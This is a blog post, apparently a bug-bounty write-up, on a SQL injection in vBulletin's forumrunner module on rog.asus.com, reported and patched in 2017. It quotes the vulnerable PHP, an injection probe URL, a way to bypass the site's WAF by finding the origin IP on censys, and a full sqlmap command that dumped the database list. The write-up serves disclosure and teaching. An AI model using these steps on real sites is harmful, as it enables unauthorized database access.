---
layout: post
title: "SQL Injection in rog.asus.com"
author: Corben Leo
---
### 🔎 Introduction & Background
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To get started, I'll give a bit of backstory behind this. I found this bug back in **January** of 2017 and was one of the first reports I made to a company.<br><br>
I was bored back in January so I decided to hunt for bugs in *.asus.com. After about an hour I came across rog.asus.com and I noticed that it also had a forum on it. It was running vBulletin 4.2.3. I did a bit of research and found that forumrunner, a core module enabled by default, was vulnerable to SQL Injection in this version.
#### 😕 What is ForumRunner?
> Forum Runner is a vBulletin, XenForo, myBB, and phpBB forum add-on that allows your users to access your forum at blazing fast speeds by using a native application installed on their mobile phone

#### How is it vulnerable?
> vBulletin's code standards use clean_gpc() and clean_array_gpc() functions to sanitize input data, so PHP superglobal arrays are not accessed directly. I would use the word "sanitize" very loosely here, as this vulnerability has just proven that these sanitizing functions are simply not enough.
<br>

So it all comes down to `/forumrunner/includes/moderation.php`:
```php
function do_get_spam_data() {
    global $vbulletin, $db, $vbphrase;


    $vbulletin->input->clean_array_gpc('r', array(
    'threadid' => TYPE_STRING,
    'postids' => TYPE_STRING,
));

------ snip ------

} else if ($vbulletin->GPC['postids'] != ") {
$postids = $vbulletin->GPC['postids'];

$posts = $db->query_read_slave("
SELECT post.postid, post.threadid, post.visible, post.title, post.userid,
thread.forumid, thread.title AS thread_title, thread.postuserid, thread.visible AS thread_visible, thread.firstpostid
FROM " . TABLE_PREFIX . "post AS post
LEFT JOIN " . TABLE_PREFIX . "thread AS thread USING (threadid)
WHERE postid IN ($postids)
");
```
<br>
So both `postids` and `threadid` are filtered as a TYPE_STRING, placed into an array (`$vbulletin->GPC`), and then added to the database. TYPE_STRING filtered variables are not protected from SQL Injection.
<br><br>
This is makes the forumrunner module vulnerable to both MySQL boolean-based blind and time-based blind injection.
<br><br>
### 😋 Exploitation
So I checked if ASUS had applied the patch by visiting:<br>
`https://rog.asus.com/forum/forumrunner/request.php?d=1&cmd=get_spam_data&postids=1'` and an SQL error was thrown! I threw it into SQLMAP as one does (I suck at manual exploitation of SQL Injection, mainly because I haven't ever gotten past getting some basic info from `UNION ALL SELECT`), however there was a WAF in place so I couldn't extract any data whatsoever.<br><br>
I went to <a href="https://censys.io">censys.io</a> and searched 'Republic of Gamers' and quickly found the backend IP of the server, in hopes that this would bypass the WAF.
<br><br>
I ran:
```bash
sqlmap -u "http://103.10.4.162/forum/forumrunner/request.php?d=1&cmd=get_spam_data&postids=1*" --random-agent -threads=10 --level 5 --dbs
```
and it listed out all of the databases on the site! I had successfully bypassed the WAF. I reported it and they patched it within 2 days. <br><br>Sadly they didn't have any sort of bounty, but it was still fun!
<br>
### References
* https://enumerated.wordpress.com/2016/07/11/1/
* http://blog.securelayer7.net/vbulletin-sql-injection-exploit-cve-2016-6195/

<br>
Thanks for reading,<br><br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/sxcurity"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
